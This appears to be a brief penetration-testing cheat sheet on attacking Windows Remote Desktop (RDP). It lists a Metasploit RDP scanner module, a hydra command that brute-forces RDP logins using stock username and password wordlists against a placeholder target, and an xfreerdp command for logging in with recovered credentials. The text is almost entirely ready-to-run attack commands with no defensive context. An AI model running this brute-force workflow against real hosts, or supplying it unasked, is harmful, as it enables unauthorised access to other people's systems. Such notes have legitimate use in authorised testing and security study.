# Exploiting RDP

RDP can be configured to run on a different port than 3389.

## Metasploit

```service postgresql start && msfconsole```  
Module: auxiliary/scanner/rdp/rdp_scanner  

## Brute Force RDP
```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://(target IP address)```  
if the port is different, use ```-s (port number)```  

## Authenticating with target via RDP
**xfreerdp** -- Tool used to connect via RDP  
```xfreerdp /u:(username) /p:(password) /v:(Ip address):(port)``` 


